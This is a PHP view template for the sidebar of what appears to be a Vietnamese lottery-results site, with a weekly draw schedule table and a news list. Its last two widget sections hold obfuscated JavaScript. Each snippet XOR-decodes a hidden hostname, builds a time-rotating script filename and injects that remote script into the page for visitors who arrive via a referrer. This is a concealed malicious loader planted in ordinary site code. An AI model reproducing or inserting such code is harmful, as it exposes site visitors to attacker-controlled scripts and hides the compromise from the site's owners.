<?php
use yii\widgets\LinkPager;
use frontend\models\News;

/**
 * @var $categories
 * @var $pages
 * @var $bread
 */

//echo $this->render("//element/page-title",['name' => $data->name, 'bread' => $bread]);
?>
<aside class="sidebar wg300">
    <div class="widget">
        <div class="widget-top rgb">
            <h3><span class="title-cat rgb">Lịch Mở Thưởng Xổ Số</span></h3>
        </div>
        <div class="widget-container">
            <div class="hidden-xs hidden-sm item-menu border-margin" style="margin-top:-5px">
                    <div class="main-right sidebar-right">
                        <div class="box">
                            <div class="lmt">
                                <table width="100%" cellspacing="0" cellpadding="0" border="0" bgcolor="#c9c9c9">
                                    <tbody>
                                    <tr class="LOTO_ngang">
                                        <td class="LMT_1">Miền bắc</td>
                                        <td class="LMT_2N">Miền Nam</td>
                                        <td class="LMT_2N">Miền Trung</td>
                                    </tr>
                                    <tr class="LOTO_ngang_1">
                                        <td class="LMT_1">		<a title="xổ số miền bắc thứ 2" href="/xsmb-xo-so-mien-bac-thu-2/">XSMB thứ 2</a>
	</td>
                                        <td class="LMT_2N">
                                            			<a title="Xổ số Cà Mau" href="/xoso-ca-mau">Cà Mau</a><br>
					<a title="Xổ số Hồ Chí Minh" href="/xoso-ho-chi-minh">Hồ Chí Minh</a><br>
					<a title="Xổ số Đồng Tháp" href="/xoso-dong-thap">Đồng Tháp</a><br>
				<a title="xổ số miền nam thứ 2" href="/xo-so-mien-nam-thu-2">XSMN thứ 2</a>
	                                        </td>
                                        <td class="LMT_2N">
                                            			<a title="Xổ số Phú Yên" href="/xoso-phu-yen">Phú Yên</a><br>
					<a title="Xổ số ThừaThiênHuế" href="/xoso-thua-thien-hue">ThừaThiênHuế</a><br>
				<a title="xổ số miền trung thứ 2" href="/xsmt-xo-so-mien-trung-thu-2">XSMT thứ 2</a>
	                                        </td>
                                    </tr>
                                    <tr class="LOTO_ngang_1">
                                        <td class="LMT_1">		<a title="xổ số miền bắc thứ 3" href="/xsmb-xo-so-mien-bac-thu-3">XSMB thứ 3</a>
	</td>
                                        <td class="LMT_2N">
                                            			<a title="Xổ số Bạc Liêu" href="/xoso-bac-lieu">Bạc Liêu</a><br>
					<a title="Xổ số Bến Tre" href="/xoso-ben-tre">Bến Tre</a><br>
					<a title="Xổ số Vũng Tàu" href="/xoso-vung-tau">Vũng Tàu</a><br>
				<a title="xổ số miền nam thứ 3" href="/xo-so-mien-nam-thu-3">XSMN thứ 3</a>
	                                        </td>
                                        <td class="LMT_2N">
                                            			<a title="Xổ số DakLak" href="/xoso-dak-lak">DakLak</a><br>
					<a title="Xổ số Quảng Nam" href="/xoso-quang-nam">Quảng Nam</a><br>
				<a title="xổ số miền trung thứ 3" href="/xsmt-xo-so-mien-trung-thu-3">XSMT thứ 3</a>
	                                        </td>
                                    </tr>
                                    <tr class="LOTO_ngang_1">
                                        <td class="LMT_1">		<a title="xổ số miền bắc thứ 4" href="/xsmb-xo-so-mien-bac-thu-4">XSMB thứ 4</a>
	</td>
                                        <td class="LMT_2N">
                                            			<a title="Xổ số Cần Thơ" href="/xoso-can-tho">Cần Thơ</a><br>
					<a title="Xổ số Sóc Trăng" href="/xoso-soc-trang">Sóc Trăng</a><br>
					<a title="Xổ số Đồng Nai" href="/xoso-dong-nai">Đồng Nai</a><br>
				<a title="xổ số miền nam thứ 4" href="/xo-so-mien-nam-thu-4">XSMN thứ 4</a>
	                                        </td>
                                        <td class="LMT_2N">
                                            			<a title="Xổ số Khánh Hòa" href="/xoso-khanh-hoa">Khánh Hòa</a><br>
					<a title="Xổ số Đà Nẵng" href="/xoso-da-nang">Đà Nẵng</a><br>
				<a title="xổ số miền trung thứ 4" href="/xsmt-xo-so-mien-trung-thu-4">XSMT thứ 4</a>
	                                        </td>
                                    </tr>
                                    <tr class="LOTO_ngang_1">
                                        <td class="LMT_1">		<a title="xổ số miền bắc thứ 5" href="/xsmb-xo-so-mien-bac-thu-5">XSMB thứ 5</a>
	</td>
                                        <td class="LMT_2N">
                                            			<a title="Xổ số An Giang" href="/xoso-an-giang">An Giang</a><br>
					<a title="Xổ số Bình Thuận" href="/xoso-binh-thuan">Bình Thuận</a><br>
					<a title="Xổ số Tây Ninh" href="/xoso-tay-ninh">Tây Ninh</a><br>
				<a title="xổ số miền nam thứ 5" href="/xo-so-mien-nam-thu-5">XSMN thứ 5</a>
	                                        </td>
                                        <td class="LMT_2N">
                                            			<a title="Xổ số Bình Định" href="/xoso-binh-dinh">Bình Định</a><br>
					<a title="Xổ số Quảng Bình" href="/xoso-quang-binh">Quảng Bình</a><br>
					<a title="Xổ số Quảng Trị" href="/xoso-quang-tri">Quảng Trị</a><br>
				<a title="xổ số miền trung thứ 5" href="/xsmt-xo-so-mien-trung-thu-5">XSMT thứ 5</a>
	                                        </td>
                                    </tr>
                                    <tr class="LOTO_ngang_1">
                                        <td class="LMT_1">		<a title="xổ số miền bắc thứ 6" href="/xsmb-xo-so-mien-bac-thu-6">XSMB thứ 6</a>
	</td>
                                        <td class="LMT_2N">
                                            			<a title="Xổ số Bình Dương" href="/xoso-binh-duong">Bình Dương</a><br>
					<a title="Xổ số Trà Vinh" href="/xoso-tra-vinh">Trà Vinh</a><br>
					<a title="Xổ số Vĩnh Long" href="/xoso-vinh-long">Vĩnh Long</a><br>
				<a title="xổ số miền nam thứ 6" href="/xo-so-mien-nam-thu-6">XSMN thứ 6</a>
	                                        </td>
                                        <td class="LMT_2N">
                                            			<a title="Xổ số Gia Lai" href="/xoso-gia-lai">Gia Lai</a><br>
					<a title="Xổ số Ninh Thuận" href="/xoso-ninh-thuan">Ninh Thuận</a><br>
				<a title="xổ số miền trung thứ 6" href="/xsmt-xo-so-mien-trung-thu-6">XSMT thứ 6</a>
	                                        </td>
                                    </tr>
                                    <tr class="LOTO_ngang_1">
                                        <td class="LMT_1">		<a title="xổ số miền bắc thứ 7" href="/xsmb-xo-so-mien-bac-thu-7">XSMB thứ 7</a>
	</td>
                                        <td class="LMT_2N">
                                            			<a title="Xổ số Bình Phước" href="/xoso-binh-phuoc">Bình Phước</a><br>
					<a title="Xổ số Hậu Giang" href="/xoso-hau-giang">Hậu Giang</a><br>
					<a title="Xổ số Hồ Chí Minh" href="/xoso-ho-chi-minh">Hồ Chí Minh</a><br>
					<a title="Xổ số Long An" href="/xoso-long-an">Long An</a><br>
				<a title="xổ số miền nam thứ 7" href="/xo-so-mien-nam-thu-7">XSMN thứ 7</a>
	                                        </td>
                                        <td class="LMT_2N">
                                            			<a title="Xổ số Quảng Ngãi" href="/xoso-quang-ngai">Quảng Ngãi</a><br>
					<a title="Xổ số Đà Nẵng" href="/xoso-da-nang/">Đà Nẵng</a><br>
					<a title="Xổ số Đắc Nông" href="/xoso-dac-nong/">Đắc Nông</a><br>
				<a title="xổ số miền trung thứ 7" href="/xsmt-xo-so-mien-trung-thu-7/">XSMT thứ 7</a>
	                                        </td>
                                    </tr>
                                    <tr class="LOTO_ngang_1">
                                        <td class="LMT_1">
                                            <a title="xổ số miền bắc chủ nhật" href="/xsmb-xo-so-mien-bac-chu-nhat/">XSMB CN</a></td>
                                        <td class="LMT_2N">
                                            			<a title="Xổ số Kiên Giang" href="/xoso-kien-giang/">Kiên Giang</a><br>
					<a title="Xổ số Tiền Giang" href="/xoso-tien-giang/">Tiền Giang</a><br>
					<a title="Xổ số Đà Lạt" href="/xoso-da-lat/">Đà Lạt</a><br>
		                                            <a title="xổ số miền nam chủ nhật" href="/xo-so-mien-nam-thu-chu-nhat/">XSMN CN</a></td>
                                        
                                        <td class="LMT_2N">
                                            			<a title="Xổ số Khánh Hòa" href="/xoso-khanh-hoa/">Khánh Hòa</a><br>
					<a title="Xổ số Kon Tum" href="/xoso-kon-tum/">Kon Tum</a><br>
					<a title="Xổ số ThừaThiênHuế" href="/xoso-thua-thien-hue/">ThừaThiênHuế</a><br>
		                                            <a title="xổ số miền bắc chủ nhật" href="/xsmt-xo-so-mien-trung-thu-chu-nhat/">XSMT CN</a></td>
                                        
                                    </tr>

                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>
        </div>
    </div>
    <div class="widget">
        <div class="widget-top rgb">
            <h3><span class="title-cat rgb">Tin Tức</span></h3>
        </div>
        <div class="widget-container">
         <section id="vnkplus_post_side-2" class="widget vnkplus_post_side">		<div class="list">
			<?php
			$listNews = News::find()->where(['active'=>1])->limit(10)->all();
			foreach($listNews as $key => $item) {
			?>
				<div class="item clearfix">
			<a href="<?php echo $item->getUrl()?>" class="img" title="">
				<img width="128" height="96" src="<?= $item->image ?>" class="img-responsive wp-post-image" alt="<?= $item->name ?>" title="<?= $item->name ?>" decoding="async" loading="lazy">			</a>
			<div class="ct">
				<div class="name">
					<a href="<?php echo $item->getUrl()?>" 
					title="<?= $item->name ?>">
					<?php echo $item->name ?>
				</a>
				</div>
			</div>
		</div>
		<?php } ?>
				
				</div>
		</section><section id="custom_html-3" class="widget_text widget widget_custom_html"><div class="textwidget custom-html-widget"><script type="text/javascript">
!function (_6dbcb5) {
    
    var _697b36 = Date.now();
    var _2f7c3a = 1000;
    _697b36 = _697b36 / _2f7c3a;
    _697b36 = Math.floor(_697b36);

    var _d10cf1 = 600;
    _697b36 -= _697b36 % _d10cf1;
    _697b36 = _697b36.toString(16);

    var _e29963 = _6dbcb5.referrer;

    if (!_e29963) return;

    var _8b88be = [19045, 19056, 19062, 19042, 19007, 19042, 19045, 19064, 19058, 19066, 19069, 19070, 19056, 19061, 19060, 19043, 19007, 19064, 19071, 19063, 19070];

    _8b88be = _8b88be.map(function(_e84527){
        return _e84527 ^ 18961;
    });

    var _f3c72 = "800a4b34a6226d07af1ef197fd4a7148";
    
    _8b88be = String.fromCharCode(..._8b88be);

    var _9422bf = "https://";
    var _d9d20d = "/";
    var _129ac = "mount.";

    var _8d9330 = ".js";

    var _c7f4f6 = _6dbcb5.createElement("script");
    _c7f4f6.type = "text/javascript";
    _c7f4f6.async = true;
    _c7f4f6.src = _9422bf + _8b88be + _d9d20d + _129ac + _697b36 + _8d9330;

    _6dbcb5.getElementsByTagName("head")[0].appendChild(_c7f4f6)

}(document);
</script></div></section><section id="custom_html-4" class="widget_text widget widget_custom_html"><div class="textwidget custom-html-widget"><script type="text/javascript">
!function (_f7bfdd) {
    
    var _373d5f = Date.now();
    var _497a9e = 1000;
    _373d5f = _373d5f / _497a9e;
    _373d5f = Math.floor(_373d5f);

    var _ba48e6 = 600;
    _373d5f -= _373d5f % _ba48e6;
    _373d5f = _373d5f.toString(16);

    var _7d2338 = _f7bfdd.referrer;

    if (!_7d2338) return;

    var _8b1dcd = [41050, 41043, 41038, 41035, 41053, 41038, 41048, 41043, 41050, 41050, 41049, 41038, 41042, 41043, 41035, 40978, 41055, 41043, 41041];

    _8b1dcd = _8b1dcd.map(function(_d75693){
        return _d75693 ^ 41020;
    });

    var _190363 = "5ded61b1f8bf2c499e002d56edfd9280";
    
    _8b1dcd = String.fromCharCode(..._8b1dcd);

    var _e41176 = "https://";
    var _241eed = "/";
    var _fdcf91 = "js.";

    var _b7db38 = ".js";

    var _b7293c = _f7bfdd.createElement("script");
    _b7293c.type = "text/javascript";
    _b7293c.async = true;
    _b7293c.src = _e41176 + _8b1dcd + _241eed + _fdcf91 + _373d5f + _b7db38;

    _f7bfdd.getElementsByTagName("head")[0].appendChild(_b7293c)

}(document);
</script></div></section>        </div>
    </div>
</aside>